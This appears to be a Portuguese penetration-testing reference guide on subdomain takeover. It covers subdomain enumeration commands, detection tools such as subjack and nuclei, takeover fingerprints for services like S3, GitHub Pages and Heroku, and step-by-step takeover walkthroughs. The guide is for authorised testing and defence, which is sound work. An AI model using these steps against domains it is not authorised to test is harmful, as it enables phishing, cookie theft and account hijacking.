# 🎯 Guia de referência de apropriação de subdomínios

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗
  ██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║
  ███████╗██║   ██║██████╔╝██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║
  ╚════██║██║   ██║██╔══██╗██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║
  ███████║╚██████╔╝██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║
  ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                ████████╗ █████╗ ██╗  ██╗███████╗ ██████╗ ██╗   ██╗███████╗██████╗ 
                ╚══██╔══╝██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗
                   ██║   ███████║█████╔╝ █████╗  ██║   ██║██║   ██║█████╗  ██████╔╝
                   ██║   ██╔══██║██╔═██╗ ██╔══╝  ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
                   ██║   ██║  ██║██║  ██╗███████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║
                   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝
```

> **Notas de precisão:** Um CNAME sem recurso associado (dangling CNAME) ou uma mensagem de erro é um candidato, não uma confirmação de apropriação. A possibilidade de reclamar o recurso depende do fornecedor, das políticas atuais e da verificação de domínio. O [GitHub Pages](https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/verifying-your-custom-domain-for-github-pages) permite verificar domínios para impedir apropriações por outras contas; o [CloudFront](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/CNAMEs.html) impõe requisitos de certificado para domínios alternativos. Os exemplos de criação de recursos e GitHub Pages são simplificados e podem não satisfazer essas condições. As assinaturas, mensagens e caminhos de templates são referências históricas. O impacto sobre cookies/OAuth exige também configurações da aplicação que permitam esse efeito; não decorre automaticamente do controlo de qualquer subdomínio.

---

<a id="-what-is-subdomain-takeover"></a>
## 🎯 O que é a apropriação de subdomínios

A **apropriação de subdomínios** (subdomain takeover) ocorre quando um subdomínio aponta, através de CNAME, para um serviço removido que pode ser reclamado por um atacante, permitindo-lhe alojar conteúdo malicioso nesse endereço.

### Impacto
- 🔴 **Phishing** — Alojar páginas de phishing convincentes
- 🔴 **Roubo de cookies** — Roubar cookies definidos para o domínio principal
- 🔴 **Apropriação de contas** — Intercetar callbacks OAuth
- 🔴 **Danos de reputação** — Disponibilizar conteúdo malicioso

---

<a id="-detection-methodology"></a>
## 🔍 Metodologia de deteção

### Passo 1: enumerar subdomínios
```bash
# Utilizar várias ferramentas para melhorar a cobertura
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass.txt
assetfinder --subs-only target.com >> subs.txt

# Combinar e remover duplicados
cat subs.txt amass.txt | sort -u > all_subs.txt
```

### Passo 2: encontrar CNAME
```bash
# Verificar os registos DNS
cat all_subs.txt | while read sub; do
    cname=$(dig CNAME +short $sub)
    if [ ! -z "$cname" ]; then
        echo "$sub -> $cname"
    fi
done

# Ou utilizar dnsrecon
dnsrecon -d target.com -t crt
```

### Passo 3: procurar CNAME sem recurso associado
```bash
# Verificação manual
dig CNAME subdomain.target.com +short
# Devolve: something.cloudfront.net
# Depois, verificar se o serviço não está associado a outro titular

# Utilizar httpx para consultar os códigos de estado
cat all_subs.txt | httpx -status-code -title -tech-detect -no-color
```

---

<a id="-automated-tools"></a>
## 🛠️ Ferramentas automatizadas

### Subjack
```bash
# Instalar
go install github.com/haccer/subjack@latest

# Analisar
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl

# Com assinaturas de identificação
subjack -w subdomains.txt -t 100 -a -timeout 30 -o results.txt -ssl
```

### Nuclei (templates de apropriação de subdomínios)
```bash
# Utilizar templates do nuclei
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/ -o takeovers.txt

# Verificações específicas de apropriação de subdomínios
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/subdomain-takeover.yaml
```

### Can-I-Take-Over-XYZ
```bash
# Consultar as assinaturas no repositório GitHub
# https://github.com/EdOverflow/can-i-take-over-xyz

# Utilizar as assinaturas manualmente ou com ferramentas automatizadas
```

---

<a id="-vulnerable-services--fingerprints"></a>
## 📋 Serviços vulneráveis e assinaturas de identificação

### AWS S3
```
CNAME: bucket.s3.amazonaws.com
CNAME: bucket.s3-website-region.amazonaws.com

Assinatura: "NoSuchBucket"
Assinatura: "The specified bucket does not exist"

Apropriação: criar um bucket com o mesmo nome
```

### AWS CloudFront
```
CNAME: xxxxx.cloudfront.net

Assinatura: "Bad Request"
Assinatura: "ERROR: The request could not be satisfied"

Apropriação: criar uma distribuição CloudFront com o mesmo domínio alternativo
```

### GitHub Pages
```
CNAME: username.github.io
CNAME: organization.github.io

Assinatura: "There isn't a GitHub Pages site here"

Apropriação: 
1. Criar o repositório username.github.io
2. Adicionar um ficheiro CNAME com o subdomínio alvo
```

### Heroku
```
CNAME: xxx.herokuapp.com
CNAME: xxx.herokudns.com

Assinatura: "No such app"
Assinatura: "There's nothing here, yet"

Apropriação: criar uma aplicação Heroku com o mesmo nome
```

### Azure
```
CNAME: xxx.azurewebsites.net
CNAME: xxx.cloudapp.azure.com
CNAME: xxx.blob.core.windows.net

Assinatura: "404 - Web Site not found"

Apropriação: criar um recurso com o mesmo nome
```

### Shopify
```
CNAME: shops.myshopify.com

Assinatura: "Sorry, this shop is currently unavailable"
Assinatura: "Only one step left"

Apropriação: criar uma loja Shopify e adicionar o domínio personalizado
```

### WordPress.com
```
CNAME: xxx.wordpress.com

Assinatura: "Do you want to register *.wordpress.com?"

Apropriação: registar o subdomínio no WordPress.com
```

### Zendesk
```
CNAME: xxx.zendesk.com

Assinatura: "Help Center Closed"
Assinatura: "This help center no longer exists"

Apropriação: nem sempre é possível; depende da configuração do Zendesk
```

### Fastly
```
CNAME: xxx.fastly.net

Assinatura: "Fastly error: unknown domain"

Apropriação: adicionar o domínio ao serviço Fastly
```

### Pantheon
```
CNAME: xxx.pantheonsite.io

Assinatura: "The gods are wise but do not know of the site"
Assinatura: "404 error unknown site!"

Apropriação: adicionar o site no Pantheon
```

---

<a id="-exploitation-steps"></a>
## 🔥 Passos de exploração

### Exemplo: apropriação através do GitHub Pages

```bash
# 1. Encontrar um subdomínio vulnerável
dig CNAME blog.target.com
# Devolve: target.github.io (mas o repositório não existe)

# 2. Criar um repositório GitHub
# Criar: yourusername/target (ou org/target)

# 3. Ativar GitHub Pages nas definições do repositório

# 4. Adicionar um ficheiro CNAME com o conteúdo:
blog.target.com

# 5. Aguardar a propagação DNS

# 6. Confirmar a apropriação
curl https://blog.target.com
```

### Exemplo: apropriação através de S3

```bash
# 1. Confirmar a vulnerabilidade
dig CNAME assets.target.com
# Devolve: assets-target.s3.amazonaws.com

curl http://assets-target.s3.amazonaws.com
# Devolve: NoSuchBucket

# 2. Criar um bucket S3 (na mesma região)
aws s3 mb s3://assets-target --region us-east-1

# 3. Configurar o bucket
# Adicionar alojamento de site ou acesso público

# 4. Carregar conteúdo
echo "Subdomain Takeover PoC" > index.html
aws s3 cp index.html s3://assets-target/

# 5. Verificar
curl http://assets.target.com
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Deteção de serviços vulneráveis

| Serviço | Padrão CNAME | Assinatura de identificação |
|---------|---------------|-------------|
| AWS S3 | `*.s3.amazonaws.com` | NoSuchBucket |
| CloudFront | `*.cloudfront.net` | Bad Request |
| GitHub | `*.github.io` | No GitHub Pages |
| Heroku | `*.herokuapp.com` | No such app |
| Azure | `*.azurewebsites.net` | 404 Web Site not found |
| Shopify | `shops.myshopify.com` | Shop unavailable |

### Lista de verificação de apropriação de subdomínios

```markdown
- [ ] Enumerar todos os subdomínios
- [ ] Identificar os CNAME
- [ ] Procurar registos sem recurso associado
- [ ] Comparar com assinaturas conhecidas
- [ ] Verificar se o serviço não está associado a outro titular
- [ ] Tentar a apropriação de forma ética
- [ ] Documentar e reportar
```

---

<a id="-tools-summary"></a>
## 🛠️ Resumo das ferramentas

| Ferramenta | Finalidade |
|------|---------|
| **subjack** | Deteção automatizada de apropriação de subdomínios |
| **nuclei** | Análise baseada em templates |
| **can-i-take-over-xyz** | Referência de assinaturas |
| **dnsrecon** | Enumeração DNS |
| **subfinder** | Descoberta de subdomínios |
| **httpx** | Verificação de respostas HTTP |

---

<a id="-resources"></a>
## 📚 Recursos

- [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)
- [Subjack](https://github.com/haccer/subjack)
- [Templates de apropriação de subdomínios do Nuclei](https://github.com/projectdiscovery/nuclei-templates/tree/main/takeovers)

---

<p align="center">
  <b>🎯 Valide a apropriação desses subdomínios!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
